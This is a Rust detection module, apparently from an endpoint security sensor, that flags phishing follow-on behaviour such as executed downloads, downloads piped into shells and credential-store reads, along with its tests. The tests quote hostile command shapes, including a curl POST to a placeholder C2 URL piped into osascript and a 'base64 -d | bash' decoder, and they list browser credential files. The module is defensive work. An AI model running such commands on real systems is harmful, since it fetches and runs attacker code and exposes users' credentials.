//! Alert-only rules for what follows a phishing click: a fresh download being
//! run (D1), a lure's command shapes (D2a-c) and a credential store opened by
//! a program that does not own it (D3). Each looks at the current event only,
//! so one act gives one verdict instead of re-firing on every later event of
//! its storyline. The lists they use are `[detection]` config.

use std::collections::{HashMap, HashSet};
use std::path::Path;

use chrono::{DateTime, Utc};
use riggs_types::config::DetectionConfig;
use riggs_types::events::{
    DownloadMark, FileAction, ProcessAction, ProcessContext, RiggsEvent, StorylineId,
};

use crate::patterns::BehaviorPattern;

/// Download marks already reported, so each fires once; cleared when full.
const MAX_SEEN_MARKS: usize = 4096;
/// Patterns one storyline gets from these rules, all rules together. Each is a
/// Low verdict at confidence 0.40, and riggs-storyline's threat score crosses
/// the default 0.5 threshold at the 20th such verdict (0.46 at the 5th); a
/// threat storyline's opened files are snapshotted on Linux. Alert-only holds
/// only while these rules alone cannot get a storyline there.
const MAX_PATTERNS_PER_STORYLINE: usize = 5;
/// Storylines whose pattern count is remembered; cleared when full.
const MAX_COUNTED_STORYLINES: usize = 4096;
/// Interpreters whose inline-code flag is `-e`: perl(1) `-e commandline`,
/// ruby(1) `-e command`, osascript(1) `-e statement`. Every other interpreter
/// gets `-c`: in sh, bash, dash, zsh, ksh, csh and tcsh `-c` reads commands
/// from an argument and `-e` exits on error, and python3(1) has `-c command`.
/// So does an interpreter added to the config that is not listed here.
const DASH_E_INTERPRETERS: &[&str] = &["perl", "ruby", "osascript"];

pub struct LureRules {
    config: DetectionConfig,
    seen_marks: HashSet<String>,
    reported: HashMap<StorylineId, usize>,
}

impl LureRules {
    pub fn new(config: &DetectionConfig) -> Self {
        Self {
            config: config.clone(),
            seen_marks: HashSet::new(),
            reported: HashMap::new(),
        }
    }

    pub fn check(&mut self, event: &RiggsEvent) -> Vec<BehaviorPattern> {
        let found: Vec<BehaviorPattern> = match event {
            RiggsEvent::Process(pe) if pe.action == ProcessAction::Exec => {
                let ctx = &pe.process_context;
                [
                    pe.download
                        .as_ref()
                        .and_then(|mark| self.executed_download(ctx, mark, pe.timestamp)),
                    pe.parent_context
                        .as_ref()
                        .and_then(|parent| self.lure_child(parent, ctx)),
                    self.lure_pipeline(ctx),
                    self.temp_exec(ctx),
                ]
                .into_iter()
                .flatten()
                .collect()
            }
            RiggsEvent::File(fe) if fe.action == FileAction::Open => self
                .credential_read(&fe.process_context, &fe.path)
                .into_iter()
                .collect(),
            _ => return Vec::new(),
        };
        if found.is_empty() {
            return found;
        }
        if self.reported.len() >= MAX_COUNTED_STORYLINES {
            self.reported.clear();
        }
        let count = self
            .reported
            .entry(event.storyline_id().clone())
            .or_default();
        let kept: Vec<BehaviorPattern> = found
            .into_iter()
            .take(MAX_PATTERNS_PER_STORYLINE.saturating_sub(*count))
            .collect();
        *count += kept.len();
        kept
    }

    /// D1: a recent download run as the executable, or handed to an interpreter.
    fn executed_download(
        &mut self,
        ctx: &ProcessContext,
        mark: &DownloadMark,
        at: DateTime<Utc>,
    ) -> Option<BehaviorPattern> {
        let mut fields = mark.quarantine.split(';');
        let downloaded = fields
            .nth(1)
            .and_then(|hex| i64::from_str_radix(hex, 16).ok())
            .and_then(|secs| DateTime::from_timestamp(secs, 0))?;
        let agent = fields
            .next()
            .filter(|a| !a.is_empty())
            .unwrap_or("an unnamed app");
        let recent = u64::try_from(at.signed_duration_since(downloaded).num_seconds())
            .is_ok_and(|age| age < self.config.download_recent_hours.saturating_mul(3600));
        let runs_it = mark.path == ctx.path || listed(&self.config.interpreters, &ctx.path);
        if !recent || !runs_it {
            return None;
        }
        if self.seen_marks.len() >= MAX_SEEN_MARKS {
            self.seen_marks.clear();
        }
        self.seen_marks
            .insert(mark.quarantine.clone())
            .then(|| BehaviorPattern::DownloadExecuted {
                detail: format!(
                    "{} (downloaded by {agent} at {downloaded}) run by {} (pid {})",
                    mark.path, ctx.path, ctx.pid
                ),
            })
    }

    /// D2a: a mail, browser or chat app starts a downloader, or an interpreter
    /// with inline code.
    fn lure_child(&self, parent: &ProcessContext, ctx: &ProcessContext) -> Option<BehaviorPattern> {
        let flag = if listed(DASH_E_INTERPRETERS, &ctx.path) {
            'e'
        } else {
            'c'
        };
        let inline_code = listed(&self.config.interpreters, &ctx.path)
            && ctx
                .cmdline
                .split_whitespace()
                .skip(1)
                .any(|arg| is_inline_code_flag(arg, flag));
        let lured = listed(&self.config.lure_parents, &parent.path)
            && (inline_code || listed(&self.config.downloaders, &ctx.path));
        lured.then(|| BehaviorPattern::LureCommand {
            detail: format!(
                "{} started {} (pid {})",
                basename(&parent.path),
                ctx.path,
                ctx.pid
            ),
        })
    }

    /// D2b: a shell whose command line feeds a download or a decoded blob
    /// through a pipe into an interpreter (`curl ... | sh`, `base64 -d | bash`).
    fn lure_pipeline(&self, ctx: &ProcessContext) -> Option<BehaviorPattern> {
        if !listed(&self.config.interpreters, &ctx.path) {
            return None;
        }
        let source = ctx
            .cmdline
            .split_whitespace()
            .map(word)
            .find(|w| basename(w) == "base64" || listed(&self.config.downloaders, w))?;
        let sink = piped_words(&ctx.cmdline)
            .into_iter()
            .map(word)
            .find(|w| listed(&self.config.interpreters, w))?;
        Some(BehaviorPattern::LureCommand {
            detail: format!("{} (pid {}) pipes {source} into {sink}", ctx.path, ctx.pid),
        })
    }

    /// D2c: a program run straight out of a temporary directory.
    fn temp_exec(&self, ctx: &ProcessContext) -> Option<BehaviorPattern> {
        let dir = Path::new(&ctx.path).parent()?;
        self.config
            .temp_exec_dirs
            .iter()
            .any(|temp| dir == Path::new(temp))
            .then(|| BehaviorPattern::LureCommand {
                detail: format!(
                    "{} (pid {}) runs from temporary directory {}",
                    ctx.path,
                    ctx.pid,
                    dir.display()
                ),
            })
    }

    /// D3: a credential store opened by an executable outside the readers.
    fn credential_read(&self, ctx: &ProcessContext, path: &str) -> Option<BehaviorPattern> {
        let store = self
            .config
            .credential_paths
            .iter()
            .any(|pattern| matches_store(path, pattern));
        let reader = self
            .config
            .credential_readers
            .iter()
            .any(|prefix| ctx.path.starts_with(prefix.as_str()));
        (store && !reader).then(|| BehaviorPattern::CredentialStoreAccess {
            detail: format!("{} (pid {}) opened {path}", ctx.path, ctx.pid),
        })
    }
}

/// Whether the basename of `path` is one of `names`, or a versioned build of
/// one (`python3.12` for `python3`, as Debian's interpreters resolve).
fn listed(names: &[impl AsRef<str>], path: &str) -> bool {
    let base = basename(path);
    names.iter().any(|name| {
        base.strip_prefix(name.as_ref())
            .is_some_and(|version| version.chars().all(|c| c.is_ascii_digit() || c == '.'))
    })
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// A command-line word without the shell quoting and grouping around it.
fn word(token: &str) -> &str {
    token.trim_matches(|c: char| "\"'`$(){};&".contains(c))
}

/// `-<flag>` or a short-flag cluster holding it (`-lc`, `-ec`, `-ne`): the
/// interpreter is given code on its command line.
fn is_inline_code_flag(arg: &str, flag: char) -> bool {
    arg.strip_prefix('-')
        .is_some_and(|flags| flags.chars().all(|c| c.is_ascii_alphabetic()) && flags.contains(flag))
}

/// The word after each pipe in a command line: a `|` outside single and
/// double quotes that is not half of `||`.
fn piped_words(cmdline: &str) -> Vec<&str> {
    let bytes = cmdline.as_bytes();
    let mut quote = None;
    let mut words = Vec::new();
    for (i, &b) in bytes.iter().enumerate() {
        match (quote, b) {
            (None, b'\'' | b'"') => quote = Some(b),
            (Some(open), _) if b == open => quote = None,
            (None, b'|') if bytes.get(i + 1) != Some(&b'|') && (i == 0 || bytes[i - 1] != b'|') => {
                words.extend(cmdline[i + 1..].split_whitespace().next());
            }
            _ => {}
        }
    }
    words
}

/// `pattern` is a substring of `path` in which each `*` stands for any run
/// of characters.
fn matches_store(path: &str, pattern: &str) -> bool {
    let mut rest = path;
    pattern.split('*').all(|part| match rest.find(part) {
        Some(at) => {
            rest = &rest[at + part.len()..];
            true
        }
        None => false,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Duration;

    // Command lines quoted from the reports the design notes cite:
    // Microsoft, "ClickFix campaign uses fake macOS utilities lures to deliver
    // infostealers" (2026-05-06), stager connectivity check and handoff:
    const MS_CURL_CHECK: &str = "/usr/bin/curl -s -H “<User-Agent>” -d “check” –connect-timeout 5 –max-time 10 <candidate_url>";
    const MS_CURL_TO_OSASCRIPT: &str =
        "curl -s -X POST <C2_URL> -H “<User-Agent>” -d “<txid>&module” | osascript";
    // Named lookalikes, quoted from https://brew.sh and https://rustup.rs:
    const HOMEBREW: &str = "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"";
    const RUSTUP: &str = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh";

    fn process(path: &str, cmdline: &str) -> ProcessContext {
        ProcessContext::new(
            4242,
            4241,
            basename(path),
            path,
            cmdline,
            "501",
            StorylineId::new(),
        )
    }

    fn exec(
        ctx: ProcessContext,
        parent: Option<ProcessContext>,
        download: Option<DownloadMark>,
    ) -> RiggsEvent {
        let mut event = RiggsEvent::new_process(ProcessAction::Exec, ctx, parent);
        if let RiggsEvent::Process(pe) = &mut event {
            pe.download = download;
        }
        event
    }

    /// A quarantine value in the documented `flags;hex-seconds;agent;UUID`
    /// shape, stamped `age` before now.
    fn mark(path: &str, age: Duration) -> DownloadMark {
        DownloadMark {
            path: path.into(),
            quarantine: format!(
                "0083;{:x};Safari.app;BC4DFC58-6E4C-4A4F-9C5B-6B1E2D7F0A11",
                (Utc::now() - age).timestamp()
            ),
        }
    }

    fn check(event: &RiggsEvent) -> Vec<BehaviorPattern> {
        LureRules::new(&DetectionConfig::default()).check(event)
    }

    fn zsh() -> Option<ProcessContext> {
        Some(process("/bin/zsh", "-zsh"))
    }

    #[test]
    fn d1_fires_on_a_recent_download_run_as_the_executable_or_by_an_interpreter() {
        let app = "/Users/alice/Downloads/Installer.app/Contents/MacOS/Installer";
        let script = "/Users/alice/Downloads/install.sh";

        let ran = check(&exec(
            process(app, app),
            None,
            Some(mark(app, Duration::hours(1))),
        ));
        let interpreted = check(&exec(
            process("/bin/bash", &format!("/bin/bash {script}")),
            zsh(),
            Some(mark(script, Duration::hours(1))),
        ));

        assert!(matches!(
            ran.as_slice(),
            [BehaviorPattern::DownloadExecuted { detail }]
                if detail.contains(app) && detail.contains("Safari.app")
        ));
        assert!(matches!(
            interpreted.as_slice(),
            [BehaviorPattern::DownloadExecuted { .. }]
        ));
    }

    #[test]
    fn d1_ignores_old_marks_repeats_and_marked_arguments_of_other_programs() {
        let app = "/Users/alice/Downloads/Installer.app/Contents/MacOS/Installer";
        let image = "/Users/alice/Downloads/tool.dmg";
        let fresh = mark(app, Duration::hours(1));
        let mut rules = LureRules::new(&DetectionConfig::default());

        let first = rules.check(&exec(process(app, app), None, Some(fresh.clone())));
        let again = rules.check(&exec(process(app, app), None, Some(fresh)));

        assert_eq!(first.len(), 1);
        assert!(again.is_empty());
        assert!(check(&exec(
            process(app, app),
            None,
            Some(mark(app, Duration::hours(48)))
        ))
        .is_empty());
        assert!(check(&exec(
            process("/usr/bin/shasum", &format!("shasum -a 256 {image}")),
            zsh(),
            Some(mark(image, Duration::hours(1))),
        ))
        .is_empty());
    }

    #[test]
    fn d2a_fires_when_a_lure_parent_starts_a_downloader_or_inline_code() {
        let outlook = || {
            Some(process(
                "/Applications/Microsoft Outlook.app/Contents/MacOS/Microsoft Outlook",
                "/Applications/Microsoft Outlook.app/Contents/MacOS/Microsoft Outlook",
            ))
        };

        let downloader = check(&exec(
            process("/usr/bin/curl", MS_CURL_CHECK),
            outlook(),
            None,
        ));
        let inline = check(&exec(
            process("/usr/bin/osascript", "osascript -e <script>"),
            outlook(),
            None,
        ));
        let script_file = check(&exec(
            process("/bin/bash", "/bin/bash /Users/alice/Desktop/notes.sh"),
            outlook(),
            None,
        ));

        assert!(matches!(
            downloader.as_slice(),
            [BehaviorPattern::LureCommand { detail }] if detail.starts_with("Microsoft Outlook started /usr/bin/curl")
        ));
        assert!(matches!(
            inline.as_slice(),
            [BehaviorPattern::LureCommand { .. }]
        ));
        assert!(script_file.is_empty());
        assert!(check(&exec(process("/usr/bin/curl", MS_CURL_CHECK), zsh(), None)).is_empty());
    }

    #[test]
    fn d2a_inline_code_flags_follow_the_interpreter_family() {
        let from_mail = |exe: &str, cmdline: &str| {
            check(&exec(
                process(exe, cmdline),
                Some(process(
                    "/System/Applications/Mail.app/Contents/MacOS/Mail",
                    "Mail",
                )),
                None,
            ))
            .len()
        };

        // `-e` is errexit in the shells, not code.
        assert_eq!(from_mail("/bin/bash", "bash -e install.sh"), 0);
        assert_eq!(from_mail("/bin/sh", "sh -ex run.sh"), 0);
        assert_eq!(from_mail("/bin/bash", "bash -c <script>"), 1);
        assert_eq!(from_mail("/bin/zsh", "zsh -lc <script>"), 1);
        assert_eq!(from_mail("/usr/bin/perl", "perl -e <code>"), 1);
        assert_eq!(from_mail("/usr/bin/osascript", "osascript -e <script>"), 1);
        assert_eq!(from_mail("/usr/bin/python3", "python3 -c <code>"), 1);
    }

    #[test]
    fn d2b_needs_a_real_pipe() {
        // As the sensor sees `sh -c "..."`: argv joined, the outer quotes gone.
        let shell = |cmdline: &str| {
            check(&exec(
                process("/bin/sh", &format!("sh -c {cmdline}")),
                None,
                None,
            ))
        };

        assert!(shell("curl -o f URL || bash retry.sh").is_empty());
        assert!(shell("grep 'a|sh' curl.log").is_empty());
        assert!(shell("curl -s URL | grep 'a|sh'").is_empty());
        for piped in ["curl URL|sh", "curl URL | sh"] {
            assert!(matches!(
                shell(piped).as_slice(),
                [BehaviorPattern::LureCommand { detail }] if detail.ends_with("pipes curl into sh")
            ));
        }
    }

    #[test]
    fn d2b_fires_on_a_shell_piping_a_download_into_an_interpreter() {
        // The Microsoft stager's handoff line as a shell running it carries it.
        let stager = check(&exec(
            process("/bin/bash", &format!("/bin/bash -c {MS_CURL_TO_OSASCRIPT}")),
            None,
            None,
        ));
        // The `base64 -d | bash` shape (CrowdStrike, Microsoft), constructed
        // around a placeholder blob.
        let decoded = check(&exec(
            process("/bin/bash", "/bin/bash -c echo <blob> | base64 -d | bash"),
            None,
            None,
        ));

        assert!(matches!(
            stager.as_slice(),
            [BehaviorPattern::LureCommand { detail }] if detail.ends_with("pipes curl into osascript")
        ));
        assert!(matches!(
            decoded.as_slice(),
            [BehaviorPattern::LureCommand { detail }] if detail.ends_with("pipes base64 into bash")
        ));
    }

    #[test]
    fn installer_lookalikes() {
        // Homebrew's line has no pipe: the only process that carries it whole
        // is a wrapper shell, and no rule fires on it. Typed into a terminal,
        // zsh runs curl, then bash with the script text (checked against the
        // install.sh of 2026-11-12: no pipe into an interpreter).
        assert!(check(&exec(
            process("/bin/zsh", &format!("/bin/zsh -c {HOMEBREW}")),
            None,
            None
        ))
        .is_empty());
        assert!(check(&exec(
            process(
                "/usr/bin/curl",
                "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"
            ),
            zsh(),
            None,
        ))
        .is_empty());

        // rustup's line typed into a terminal: zsh runs curl and a bare sh, and
        // nothing fires. The same line inside `sh -c` (a Dockerfile RUN, a
        // Makefile) is the lure shape D2b is for, and fires.
        assert!(check(&exec(
            process(
                "/usr/bin/curl",
                "curl --proto =https --tlsv1.2 -sSf https://sh.rustup.rs"
            ),
            zsh(),
            None,
        ))
        .is_empty());
        assert!(check(&exec(process("/usr/bin/dash", "sh"), zsh(), None)).is_empty());
        assert!(matches!(
            check(&exec(
                process("/usr/bin/dash", &format!("/bin/sh -c {RUSTUP}")),
                None,
                None
            ))
            .as_slice(),
            [BehaviorPattern::LureCommand { detail }] if detail.ends_with("pipes curl into sh")
        ));
        // rustup-init runs from a fresh `mktemp -d` directory, below /tmp, not in it.
        assert!(check(&exec(
            process(
                "/tmp/tmp.Xq3vPz8kLm/rustup-init",
                "/tmp/tmp.Xq3vPz8kLm/rustup-init"
            ),
            None,
            None,
        ))
        .is_empty());
    }

    #[test]
    fn d2c_fires_on_a_program_run_straight_from_a_temp_directory() {
        // CloudSEK (AMOS via ClickFix): the payload is fetched to /tmp/update,
        // made executable and run; macOS reports it under /private/tmp.
        for path in ["/private/tmp/update", "/tmp/update"] {
            assert!(matches!(
                check(&exec(process(path, path), None, None)).as_slice(),
                [BehaviorPattern::LureCommand { detail }] if detail.contains("temporary directory")
            ));
        }
        assert!(check(&exec(
            process("/usr/local/bin/update", "update"),
            None,
            None
        ))
        .is_empty());
    }

    #[test]
    fn d2c_alerts_at_most_five_times_per_storyline() {
        let mut rules = LureRules::new(&DetectionConfig::default());
        let payload = process("/tmp/update", "/tmp/update");

        let alerts: Vec<usize> = (0..6)
            .map(|_| rules.check(&exec(payload.clone(), None, None)).len())
            .collect();
        let other_storyline = rules.check(&exec(process("/tmp/update", "/tmp/update"), None, None));

        assert_eq!(alerts, [1, 1, 1, 1, 1, 0]);
        assert_eq!(other_storyline.len(), 1);
    }

    #[test]
    fn d3_is_off_by_default_and_fires_on_a_store_opened_by_an_unlisted_program() {
        // Entries from the sourced example in config/riggs.toml.
        let enabled = DetectionConfig {
            credential_paths: vec![
                "/.mozilla/firefox/*/logins.json".into(),
                "/.config/chromium/*/Cookies".into(),
            ],
            credential_readers: vec!["/usr/lib/firefox-esr/".into(), "/usr/lib/chromium/".into()],
            ..DetectionConfig::default()
        };
        let open = |config: &DetectionConfig, exe: &str, path: &str| {
            LureRules::new(config).check(&RiggsEvent::new_file(
                FileAction::Open,
                process(exe, exe),
                path,
                None,
            ))
        };
        let logins = "/home/alice/.mozilla/firefox/x1y2z3.default-release/logins.json";
        let cookies = "/home/alice/.config/chromium/Default/Network/Cookies";
        let preferences = "/home/alice/.config/chromium/Default/Preferences";

        assert!(open(&DetectionConfig::default(), "/tmp/update", logins).is_empty());
        assert!(matches!(
            open(&enabled, "/tmp/update", logins).as_slice(),
            [BehaviorPattern::CredentialStoreAccess { detail }] if detail == &format!("/tmp/update (pid 4242) opened {logins}")
        ));
        assert_eq!(open(&enabled, "/usr/bin/python3.12", cookies).len(), 1);
        assert!(open(&enabled, "/usr/lib/firefox-esr/firefox-esr", logins).is_empty());
        assert!(open(&enabled, "/usr/lib/chromium/chromium", cookies).is_empty());
        assert!(open(&enabled, "/tmp/update", preferences).is_empty());
    }

    #[test]
    fn versioned_interpreters_match_their_base_name_only() {
        let names = vec!["python3".to_string(), "sh".to_string()];
        assert!(listed(&names, "/usr/bin/python3.12"));
        assert!(listed(&names, "/bin/sh"));
        assert!(!listed(&names, "/usr/bin/python3-config"));
        assert!(!listed(&names, "/usr/bin/shasum"));
        assert!(!listed(&names, "https://sh.rustup.rs"));
    }
}
